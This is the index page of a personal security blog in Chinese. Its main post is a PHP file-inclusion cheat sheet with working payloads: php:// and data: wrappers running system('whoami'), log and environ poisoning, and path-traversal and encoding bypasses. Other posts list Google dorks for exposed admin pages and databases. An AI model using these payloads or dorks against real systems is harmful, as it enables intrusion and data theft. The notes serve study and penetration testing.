<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="The quieter you become, the more you are able to hear.">
<meta property="og:type" content="website">
<meta property="og:title" content="Itachi Blog">
<meta property="og:url" content="http://1tachi.github.io/index.html">
<meta property="og:site_name" content="Itachi Blog">
<meta property="og:description" content="The quieter you become, the more you are able to hear.">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Itachi Blog">
<meta name="twitter:description" content="The quieter you become, the more you are able to hear.">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://1tachi.github.io/">





  <title>Itachi Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Itachi Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/04/09/sql_inject_note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/09/sql_inject_note/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-09T21:03:15+08:00">
                2019-04-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/04/08/关于大范围踩点的一些思路收集“/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/08/关于大范围踩点的一些思路收集“/" itemprop="url">关于大范围踩点的一些思路收集“</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T15:45:16+08:00">
                2019-04-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>场景：护网演习、大范围目标渗透</p>
<h3 id="思路收集"><a href="#思路收集" class="headerlink" title="思路收集"></a>思路收集</h3><ol>
<li>google，fofa，zoomeye搜索页面特征（备案、电话、机构等等）找相关站点。（避免根域搜集不全的情况）</li>
<li>wooyun历史漏洞库搜相关业务站点（避免根域搜集不全的情况）</li>
<li>找二级域(SubDomainscanner)/c段/子域名</li>
<li>确定真实IP/旁注</li>
<li>以真实IP，robtex找同网段或C段（webfind/ipscan24）（有些业务没有域名）</li>
<li>Github</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/04/03/Sec-20190403-php文件包含/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Sec-20190403-php文件包含/" itemprop="url">Sec_20190403_php文件包含</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T20:37:04+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>() <span class="comment">#如果出错的话，只会提出警告，会继续执行后续语句</span></span><br><span class="line"><span class="keyword">require</span>() <span class="comment">#如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句</span></span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include_once</span>() <span class="comment">#功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 	       require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题</span></span><br></pre></td></tr></table></figure>
<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><ol>
<li>具有相关的文件包含函数；</li>
<li>文件包含函数中存在动态变量，比如 <code>include $file;</code></li>
<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code></li>
</ol>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
<li><p>[ ] ### LFI(Local File Inclusion)</p>
</li>
<li><p>[ ] ### RFI(Remote File Inclusion)</p>
<p><code>利用条件：</code> 需要php.ini 中进行配置，且需要以下均设置为On;</p>
<p>​                   allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off</p>
<ul>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ul>
</li>
</ul>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>​    <code>利用条件：</code></p>
<ol>
<li>allow_url_include = On。</li>
<li>对allow_url_fopen不做要求。</li>
</ol>
<p>​      <code>姿势：</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//input<span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><code>利用条件：无</code></p>
<p> <code>姿势：</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">index.php?file=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
<p><code>作用：</code></p>
<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p><code>利用条件：</code></p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p><code>姿势：</code></p>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包：phpinfo.zip</p>
<p><code>指定绝对路径/相对路径：</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar:<span class="comment">//D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span></span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><code>利用条件：</code></p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p><code>姿势：</code><br>构造zip包的方法同phar。</p>
<p>但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件(注：若是使用相对路径，则会包含失败)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure></p>
<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p><code>利用条件：</code></p>
<ol>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p><code>姿势1：</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span> <span class="comment">#执行命令</span></span><br></pre></td></tr></table></figure></p>
<p><code>姿势2：</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== <span class="comment">#执行命令</span></span><br></pre></td></tr></table></figure></p>
<p>注：加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;</p>
<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p><code>利用条件：</code><br>session文件路径已知，且其中内容部分可控。<br><code>姿势：</code><br>php的session文件的保存路径可以在phpinfo的session.save_path看到；<br>在默认情况下一般是保存在/tmp目录中，session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到，要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p><code>利用条件：</code><br>需要知道服务器日志的存储路径，且日志文件可读<br><code>姿势：</code><br>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p><code>利用条件：</code><br>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log<br><code>姿势：</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM<span class="number">-207</span><span class="number">-93</span>-ubuntu:~$ ssh <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>@remotehost <span class="comment">#用ssh连接</span></span><br></pre></td></tr></table></figure></p>
<p>之后会提示输入密码等等，随便输入；然后在remotehost的ssh-log中即可写入php代码，之后进行文件包含即可。</p>
<h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h3><p><code>利用条件：</code></p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读</li>
</ol>
<p><code>姿势：</code><br>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它即可。</p>
<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>跟包含environ类似</p>
<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><code>姿势：</code><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考LFI With PHPInfo Assistance类似利用临时文件的存在，竞争时间去包含的。</p>
<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p><code>利用条件：</code><br>千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="指定前缀绕过"><a href="#指定前缀绕过" class="headerlink" title="指定前缀绕过"></a>指定前缀绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file; <span class="comment">#类似代码</span></span><br></pre></td></tr></table></figure>
<ol>
<li>目录遍历</li>
</ol>
<p>现在在/var/log/test.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历，比如我们尝试访问：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php?file=../../log/test.txt</span><br></pre></td></tr></table></figure></p>
<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
<ol start="2">
<li>编码绕过</li>
</ol>
<p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过</p>
<ul>
<li><p>[ ] 利用url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">../</span><br><span class="line">  %2e%2e%2f</span><br><span class="line">  ..%2f</span><br><span class="line">  %2e%2e/</span><br><span class="line">..\</span><br><span class="line">  %2e%2e%5c</span><br><span class="line">  ..%5c</span><br><span class="line">  %2e%2e\</span><br></pre></td></tr></table></figure>
</li>
<li><p>[ ] 二次编码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  ../</span><br><span class="line">     %252e%252e%252f</span><br><span class="line">..\</span><br><span class="line">    %252e%252e%255c</span><br></pre></td></tr></table></figure>
</li>
<li><p>[ ] 容器/服务器的编码方式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">../</span><br><span class="line">  ..%c0%af</span><br><span class="line">  %c0%ae%c0%ae/</span><br><span class="line">      注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</span><br><span class="line">      Apache Tomcat Directory Traversal</span><br><span class="line">..\</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="指定后缀绕过"><a href="#指定后缀绕过" class="headerlink" title="指定后缀绕过"></a>指定后缀绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;  <span class="comment">#测试代码</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>URL 绕过<br> url格式：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :<span class="comment">// hostname[:port] / path / [;parameters][?query]#fragment</span></span><br></pre></td></tr></table></figure>
<p> <code>姿势一：query（？）</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure>
<p> 则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br> 问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过</p>
</li>
</ol>
<p>​       <code>姿势二：fragment（#）</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http:<span class="comment">//remoteaddr/remoteinfo.txt%23</span></span><br></pre></td></tr></table></figure>
<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23</p>
<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>; <span class="comment">#测试代码</span></span><br></pre></td></tr></table></figure>
<p>利用zip协议，注意要指定绝对路径</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span></span><br></pre></td></tr></table></figure>
<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><code>利用条件：</code></p>
<p>php版本 &lt; php 5.2.8</p>
<p><code>姿势：</code></p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=././././。。。省略。。。././shell.txt</span><br></pre></td></tr></table></figure>
<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p><code>利用条件：</code></p>
<p>php版本 &lt; php 5.3.4</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt%<span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>能利用00截断的场景现在应该很少了：）</p>
<ol>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>对危险字符进行过滤等等</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/04/03/Google-Hack常用语法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Google-Hack常用语法/" itemprop="url">Google Hack常用语法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:08:19+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>##常用命令<br>inurl: 用于搜索网页上包含的URL. 这个语法对寻找网页上的搜索,帮助之类的很有用. </p>
<p>intext: 只搜索网页部分中包含的文字(也就是忽略了标题,URL等的文字).</p>
<p>site: 可以限制你搜索范围的域名. </p>
<p>filetype: 搜索文件的后缀或者扩展名</p>
<p>intitle: 限制你搜索的网页标题.</p>
<p>allintitle: 搜索所有关键字构成标题的网页. 但是推荐不要使用</p>
<p>link: 可以得到一个所有包含了某个指定URL的页面列表. 例如</p>
<p>link:<a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a> 就可以得到所有连接到Google的页面</p>
<p>##intext:管理<br>filetype:mdb</p>
<p>inurl:file</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> filetype:txt 查找TXT文件 其他的依次内推</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> intext:管理</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> inurl:login</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> intitle:后台</p>
<p>##查看服务器使用的程序</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> filetype:asp</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> filetype:php</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> filetype:jsp</p>
<p>##查看上传漏洞：<br>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> inurl:file</p>
<p>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> inurl:load</p>
<p>##查找注射点：<br>site:<a href="http://xx.com" target="_blank" rel="noopener">http://xx.com</a> filetype:asp </p>
<blockquote>
<p>site:tw inurl:asp?id= 这个是找台湾的或</p>
<p>site:jp inurl:asp?id= 这个是找日本的 </p>
<p>site:ko inurl:asp?id= 这个是找韩国的</p>
</blockquote>
<p>###eg:</p>
<blockquote>
<p>intitle:旁注- 网站xxxfiletype:asp</p>
</blockquote>
<blockquote>
<p>inurl:editor/db/</p>
</blockquote>
<blockquote>
<p>inurl:eWebEditor/db/</p>
</blockquote>
<blockquote>
<p>inurl:bbs/data/</p>
</blockquote>
<blockquote>
<p>inurl:databackup/</p>
<p>inurl:blog/data/</p>
<p>inurl:\boke\data</p>
<p>inurl:bbs/database/</p>
<p>inurl:conn.asp</p>
<p>inc/conn.asp</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/03/27/hexo 常用命令/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/27/hexo 常用命令/" itemprop="url">hexo 命令</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-27T09:34:00+08:00">
                2019-03-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#常用命令<br>npm install hexo -g #安装Hexo<br>npm update hexo -g #升级<br>hexo init #初始化博客</p>
<p>命令简写<br>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo g == hexo generate #生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy #部署</p>
<p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</p>
<p>最后安装Git部署插件，输入命令：<br>npm install hexo-deployer-git –save</p>
<p>hexo s –debug  # 在本地浏览器的localhost:4000 预览博文效果</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/03/26/mysql利用报错注入读取文件内容/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

